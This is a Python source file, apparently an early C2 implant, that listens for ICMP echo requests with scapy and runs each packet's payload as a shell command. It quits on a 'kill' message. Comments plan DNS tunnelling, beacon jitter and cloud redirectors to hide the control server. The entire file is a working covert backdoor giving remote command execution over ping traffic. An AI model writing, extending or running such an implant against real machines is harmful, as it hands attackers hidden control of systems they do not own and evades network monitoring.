#!/usr/bin/env python3

# TODO Implement ICMP first cause supposedly easier... supposedly
# TODO Later: implement DNS packet transfering with scapy, packet crafting
# TODO Later: implement some jitter for client/beacon traffic sleeping assuming we have a sendback MAYBE
# Look into platform as a service things (for the waaay future) for getting rnadom domains it would point to a cloud machine (university envir could be on the cloud) with firewall rules then the c2 server is behind the cloud machine
from scapy.all import AsyncSniffer, Packet
import subprocess
from time import sleep


def sniffHandle(packet: Packet) -> None:
    """Gets called every time a packet from the sniffer is sent, as of right now it prints the payload of the packet"""
    try:
        decodedCommand = packet[3].load.decode()
        print(decodedCommand)

        if decodedCommand == "kill":
            raise Exception("Programmed killed by server")
        elif decodedCommand == "abcdefghijklmnopqrstuvwabcdefghi":
            pass
        else:
            subprocess.run(decodedCommand, shell=True)
    except UnicodeDecodeError:
        print("Oh well")


def sniffer() -> None:
    """Starts an asynchronus sniffer then allows for the program to be interrupted"""
    sniffer = AsyncSniffer(filter="icmp[icmptype]=8", prn=sniffHandle)

    print("[*] Start sniffing...")
    sniffer.start()

    try:
        # TODO find a way to make this betterer
        while True:
            sleep(1)
    except KeyboardInterrupt:
        print("[*] Stop sniffing")
        sniffer.stop()


def main() -> None:
    """Runs the client handling the packets"""
    sniffer()


if __name__ == "__main__":
    main()
